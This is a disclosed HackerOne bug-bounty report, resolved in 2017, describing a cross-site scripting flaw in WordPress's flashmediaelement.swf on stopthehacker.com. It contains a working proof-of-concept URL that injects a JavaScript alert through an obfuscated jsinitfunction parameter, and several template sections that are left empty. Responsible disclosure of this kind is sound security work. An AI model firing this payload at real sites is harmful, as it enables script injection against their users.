---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '137964'
original_report_id: '137964'
title: Wordpress  flashmediaelement.swf XSS on stopthehacker.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: stopthehacker
created_at: '2016-05-11T17:38:48.686Z'
disclosed_at: '2017-01-12T13:05:08.777Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Wordpress  flashmediaelement.swf XSS on stopthehacker.com

## Metadata

- HackerOne Report ID: 137964
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: stopthehacker
- Disclosed At: 2017-01-12T13:05:08.777Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,  

It appears that the domain stopthehacker.com has an XSS vulnerability, specifically in flashmediaelement.swf.  



PoC:  
https://www.stopthehacker.com/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`PoC%20PoC%20PoC`  

Please see the attached screen shot for the alert box returned.  

Kind regards!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
